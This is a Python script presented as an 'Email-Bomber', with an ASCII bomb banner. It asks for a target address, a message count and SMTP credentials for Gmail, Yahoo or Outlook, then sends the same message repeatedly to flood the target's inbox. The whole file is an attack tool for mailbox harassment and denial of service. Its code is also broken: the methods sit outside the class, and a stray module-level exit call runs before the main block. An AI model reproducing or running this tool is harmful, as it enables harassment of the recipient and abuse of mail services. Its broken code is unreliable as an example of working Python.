import smtplib
import sys


class bcolors:
         GREEN = '\033[92m'
         YELLOW = '\033[92m'
         RED = '\033[92m'

         def banner():
           print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+]')
           print(bcolors.GREEN +'+[+[+[ made by dhdh2k24 ]+]+]+]')
           print(bcolors.GREEN + '''
       \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|              Author: dhdh2k24
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' ''')
class Email_bomber:
  count = 0

  def __init__(self):
    try:
      print(bcolors.RED + '\n+[+[+[ initalizing program ]+]+]+')
      self.target = str(input(bcolors.GREEN + 'Enter targets email <: '))
      self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4)  || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
      if int (self.mode) > int(4) or int(self.mode) < int(1):
         print('ERROR: invalid option. goodbye.')
         sys.exit(1)
    except Exception as e:
       print(f'ERROR: {e}')

def bomb(self):
  try:
    print(bcolors.RED + '\n+[+[+[ setting up the bomb ]+]+]+')
    self.amount = None
    if self.mode == (1):
      self.amount = int(1000)
    elif self.mode == int(2):
      self.amount = int(500)
    elif self.mode == int(3):
      self.amount = int(250)
    else:
      self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
    print(bcolors.RED + f'\n+[+[+[ you have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
  except Exception as e:
     print(f'ERROR: {e}')

def email(self):
    try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            defualt_port = True
            if self.server not in premade:
               defualt_port = False
               self.port = int(input(bcolors.GREEN + 'enter port number <: '))


            if defualt_port == True:
                self.port = int(587)

            if self.server == '1':
               self.server = 'smtp.gmail.com'

            elif self.server == '2':
               self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
               self.server = 'smtp-mail.outlook.com'


            self.fromAddr = str(input(bcolors.GREEN + 'enter from address <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'enter from password <: '))
            self.subject = str(input(bcolors.GREEN + 'enter subject <: '))
            self.message = str(input(bcolors.GREEN + 'enter message <: '))

            self.msg = '''From:  %s\nTo: %s\nSubject %s\n%s\n
            ''' %(self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
    except Exception as e:
       print(f'ERROR:{e}')

def send(self):
    try:
       self.s.sendmail(self.fromAddr, self.target, self.msg)
       self.count +=1
       print(bcolors.YELLOW + f'BOMB: {self.count}')
    except Exception as e:
       print(f'ERROR: {e}')


def attack(self):
 print(bcolors.RED + '\n[+[+[+[ attacking...]+]+]+]')
 for email in range(self.amount+1):
     self.send()
 self.s.close()
print(bcolors.RED + '\n+[+[+[ attack fineshed ]+]+]+')
sys.exit(0)


if __name__=='__main__':
   banner()
   bomb = Email_bomber()
   bomb.bomb()
   bomb.email()
   bomb.attack()